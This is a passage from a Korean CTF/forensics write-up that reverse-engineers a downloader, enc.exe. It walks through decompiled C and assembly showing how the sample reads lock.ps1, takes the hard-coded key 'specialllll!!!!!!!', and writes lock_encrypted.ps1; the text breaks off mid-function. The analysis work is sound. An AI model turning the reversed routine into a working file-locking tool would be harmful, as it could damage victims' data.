id="3-암호화-쉘스크립트-다운로더-분석encexe">3. 암호화 쉘스크립트 다운로더 분석(enc.exe)</h1> <p><br /></p> <h2 id="31-overview">3.1. Overview</h2> <p>해당 다운로더를 virustotal에 돌려보면, 아래와 같은 행위가 나온다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2029.png" alt="image.png" width="80%" height="80%" /></p> <p>따라서, 다운로더 내부에 <code class="language-plaintext highlighter-rouge">lock.ps1</code> 혹은 <code class="language-plaintext highlighter-rouge">lock_encrypted.ps1</code>을 콜하는 루틴이 있는지 확인해 보았다.</p> <p><code class="language-plaintext highlighter-rouge">lock.ps1</code> 파일을 확보해야 하니까…</p> <p><br /></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2030.png" alt="image.png" width="80%" height="80%" /></p> <p>있음</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2031.png" alt="image.png" width="80%" height="80%" /></p> <p>main함수의 초장부터 콜하네</p> <p>XOR이라면 대칭키일듯?</p> <p><br /></p> <p>main의 전문은 다음과 같음</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v7</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+4h] [ebp-58h] BYREF</span>
  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-48h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-44h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">Block</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-40h] BYREF</span>
  <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [esp+2Ch] [ebp-30h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [esp+30h] [ebp-2Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+34h] [ebp-28h] BYREF</span>
  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [esp+44h] [ebp-18h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [esp+48h] [ebp-14h]</span>
  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [esp+58h] [ebp-4h]</span>

  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
  <span class="n">sub_405220</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="s">"lock.ps1"</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
  <span class="n">v16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v13</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
  <span class="n">v15</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">sub_405220</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="s">"lock_encrypted.ps1"</span><span class="p">,</span> <span class="mh">0x12u</span><span class="p">);</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Block</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
  <span class="n">v12</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">sub_405220</span><span class="p">(</span><span class="n">Block</span><span class="p">,</span> <span class="s">"specialllll!!!!!!!"</span><span class="p">,</span> <span class="mh">0x12u</span><span class="p">);</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="n">sub_401E80</span><span class="p">(</span><span class="n">Block</span><span class="p">);</span>

<span class="cp"># --- 후략; ---
# 오류가 발생하지 않은 이상 진입할 일 없는 code branch
</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>암호화 루틴이라기보다는 암호화 루틴을 콜하는 부분에 가까운 듯</p> <p><br /></p> <h2 id="32-sub_405220-분석">3.2. sub_405220 분석</h2> <p>해당 함수는 main에서 총 3회 아래와 같이 콜되는 함수</p> <ul> <li><code class="language-plaintext highlighter-rouge">sub_405220(v7, "lock.ps1", 8u);</code></li> <li><code class="language-plaintext highlighter-rouge">sub_405220(v13, "lock_encrypted.ps1", 0x12u);</code></li> <li><code class="language-plaintext highlighter-rouge">sub_405220(Block, "specialllll!!!!!!!", 0x12u);</code></li> </ul> <p>핵심은 첫 번째 인자에 뭐가 들어와서 리턴되느냐인가?</p> <p>맞는 듯</p> <p>사유</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2032.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p>C 계열 언어로 컴파일된 프로그램상에서 함수를 콜했는데 결과값을 *ax에 넣는 흐름이 없음</p> <p>그럼 인자로 준 포인터 계열 파라미터가 Caller 와 Callee를 연결할 수 있는 방법일 텐데</p> <p>main에서 해당 함수를 호출하는 양상을 봤을 때 첫 번째 파라미터가 1) 포인터 계열이고 2) 3개 인자 중 유일하게 비어 있는 인자임</p> <p><br /></p> <p>그럼 해당 함수는 첫 번째 인자에 최종적으로 뭘 넣어주는지 확인해 보자.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="n">__thiscall</span> <span class="nf">sub_405220</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">return_value</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">Src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">Size</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">size_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">size_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-4h]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">Size</span> <span class="o">&gt;</span> <span class="mh">0x7FFFFFFF</span> <span class="p">)</span>
    <span class="n">sub_401270</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">Size</span> <span class="o">&lt;=</span> <span class="mh">0xF</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">return_value</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
    <span class="n">return_value</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">memmove</span><span class="p">(</span><span class="n">return_value</span><span class="p">,</span> <span class="n">Src</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">return_value</span> <span class="o">+</span> <span class="n">Size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">Size</span> <span class="o">|</span> <span class="mh">0xF</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">Size</span> <span class="o">|</span> <span class="mh">0xF</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x7FFFFFFF</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="mh">0x7FFFFFFF</span><span class="p">;</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483613</span><span class="p">;</span>
<span class="nl">LABEL_6:</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">operator</span> <span class="n">new</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
    <span class="n">v8</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v7</span> <span class="p">)</span>
      <span class="n">_invalid_parameter_noinfo_noreturn</span><span class="p">();</span>
    <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">35</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFE0</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="n">v9</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">LABEL_15</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">&lt;</span> <span class="mh">0x16</span> <span class="p">)</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="mi">22</span><span class="p">;</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
    <span class="k">goto</span> <span class="n">LABEL_15</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v9</span> <span class="o">&gt;=</span> <span class="mh">0x1000</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">36</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">36</span> <span class="o">&lt;=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="n">sub_4011D0</span><span class="p">();</span>
    <span class="k">goto</span> <span class="n">LABEL_6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="n">operator</span> <span class="n">new</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="nl">LABEL_15:</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
  <span class="o">*</span><span class="n">return_value</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
  <span class="n">return_value</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
  <span class="n">return_value</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="n">memmove</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">Src</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v10</span> <span class="o">+</span> <span class="n">Size</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><br /></p> <p>code branch를 다 볼 필요는 없고</p> <p>0글자~0xF글자</p> <p>0x10글자~0x1F글자</p> <p>이쪽만 보면 될 것</p> <p><br /></p> <p>사유</p> <p>어차피 Size에 8 아니면 0x12만 들어갈텐데 뭐</p> <p>모르겠으면 저 코드 끝나고 리턴하는 부분에서 얼마씩이 *return_value에 담겨오는지 bp 걸고 보면 되겠지….</p> <p><br /></p> <p>저 코드의 return은 신경 안 써도 된다고 생각함.</p> <p>왜냐.</p> <p>caller는 저 함수를 콜해놓고 *ax를 참조하지 않음</p> <p>실제로 어셈으로 확인하면</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2033.png" alt="image.png" width="50%" height="50%" /></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2034.png" alt="image.png" width="50%" height="50%" /></p> <p>*ax에 뭘 넣는 것도 없고, retn 8로 지역변수를 선언하느라 올렸던 스택프레임만 원상복구하는 모습을 볼 수 있음</p> <p>아무튼 뭘 하든 결국 <code class="language-plaintext highlighter-rouge">memmove</code>를 하게 됨</p> <p>따라서 핵심 함수가 아님</p> <p><br /></p> <p>이제 main 함수의 다음 부분을 보자.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sub_405220</span><span class="p">(</span><span class="n">Block</span><span class="p">,</span> <span class="s">"specialllll!!!!!!!"</span><span class="p">,</span> <span class="mh">0x12u</span><span class="p">);</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="n">sub_401E80</span><span class="p">(</span><span class="n">Block</span><span class="p">);</span>
</code></pre></div></div> <p><br /></p> <h2 id="33-sub_401e80-분석">3.3. sub_401E80 분석</h2> <p>저건 sub_401E80(“specialllll!!!!!!!”) 로 해석해도 무방할 듯 하다.</p> <p>다만 main에서 보이는 sub_401E80의 인자 수와 sub_401E80 내부에서 보이는 인자 수가 달라 교차 검증을 진행했다.</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; main에서 sub_401E80을 콜하기 전까지의 행위</span>

<span class="nf">call</span>    <span class="nv">memmove_sub_405220</span> <span class="c1">; Size=8 || 18</span>
<span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">Bl</span><span class="nv">ock</span><span class="p">]</span>
<span class="c1">;   } // starts at 4023E7</span>
<span class="c1">;   try {</span>
<span class="nf">mov</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="mi">2</span>
<span class="nf">push</span>    <span class="nb">eax</span>
<span class="nf">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_28</span><span class="p">]</span>
<span class="nf">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">str__lock_ps1</span><span class="p">]</span>
<span class="nf">call</span>    <span class="nv">sub_401E80</span>
</code></pre></div></div> <p>eax는 확실히 인자로 가는 것 같고,</p> <p>이상한 건 edx, ecx</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; sub_401E80에서 edx, ecx에 최초로 접근하는 시점</span>
<span class="nf">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">edx</span>
<span class="nf">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">ecx</span>
<span class="nf">push</span>    <span class="mh">0B8h</span>            <span class="c1">; Size</span>
<span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_184</span><span class="p">]</span>
<span class="nf">push</span>    <span class="mi">0</span>               <span class="c1">; Val</span>
<span class="nf">push</span>    <span class="nb">eax</span>             <span class="c1">; void *</span>
<span class="nf">call</span>    <span class="nv">_memset</span>
<span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
<span class="nf">cmp</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mh">14h</span><span class="p">],</span> <span class="mh">0Fh</span>
<span class="nf">jbe</span>     <span class="nv">short</span> <span class="nv">loc_401ED0</span>
</code></pre></div></div> <p>내부에서 쓰는 게 맞다.</p> <p>그럼 main에서 sub_401E80를 고쳐주자.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2035.png" alt="image.png" width="80%" height="80%" /></p> <p>아주 좋아</p> <p><br /></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">__usercall</span> <span class="nf">sub_401E80</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="n">str__lock_encrypted_ps1</span><span class="err">@</span><span class="o">&lt;</span><span class="n">edx</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">_DWORD</span> <span class="o">*</span><span class="n">str__lock_ps1</span><span class="err">@</span><span class="o">&lt;</span><span class="n">ecx</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">_DWORD</span> <span class="o">*</span><span class="n">str_special</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">Block_1_ptr</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">Block_0_ptr</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// edx</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v12</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [esp-Ch] [ebp-1B4h]</span>
  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [esp-Ch] [ebp-1B4h]</span>
  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-1B0h]</span>
  <span class="kt">int</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-1B0h]</span>
  <span class="kt">int</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [esp-4h] [ebp-1ACh]</span>
  <span class="kt">int</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [esp-4h] [ebp-1ACh]</span>
  <span class="kt">void</span> <span class="o">**</span><span class="n">Block_ptr</span><span class="p">;</span> <span class="c1">// [esp+20h] [ebp-188h]</span>
  <span class="kt">int</span> <span class="n">v21</span><span class="p">[</span><span class="mi">46</span><span class="p">];</span> <span class="c1">// [esp+24h] [ebp-184h] BYREF</span>
  <span class="kt">int</span> <span class="n">v22</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [esp+DCh] [ebp-CCh] BYREF</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">Block</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [esp+18Ch] [ebp-1Ch] BYREF</span>
  <span class="kt">int</span> <span class="n">v24</span><span class="p">;</span> <span class="c1">// [esp+194h] [ebp-14h]</span>
  <span class="kt">int</span> <span class="n">v25</span><span class="p">;</span> <span class="c1">// [esp+1A4h] [ebp-4h]</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">v21</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v21</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">str__lock_ps1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xFu</span> <span class="p">)</span>
    <span class="n">str__lock_ps1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">str__lock_ps1</span><span class="p">;</span>
  <span class="n">sub_404210</span><span class="p">(</span><span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">str__lock_ps1</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="n">v16</span><span class="p">,</span> <span class="n">v18</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v21</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ifstream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">112</span><span class="p">;</span>
  <span class="n">v25</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v22</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">str__lock_encrypted_ps1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xFu</span> <span class="p">)</span>
    <span class="n">str__lock_encrypted_ps1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">str__lock_encrypted_ps1</span><span class="p">;</span>
  <span class="n">sub_403CB0</span><span class="p">(</span><span class="n">str__lock_encrypted_ps1</span><span class="p">,</span> <span class="n">v15</span><span class="p">,</span> <span class="n">v17</span><span class="p">,</span> <span class="n">v19</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v22</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ofstream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">45</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">104</span><span class="p">;</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>                              <span class="c1">// 여기까지 v21과 v22에 각자 파일 내용을 넣는 것 같음</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v21</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">v22</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Block</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
    <span class="n">v24</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>
    <span class="n">v24</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Block_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">;</span>
    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">sub_405940</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v5</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">Block_1_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">Block_0_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">Block_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">str_special</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
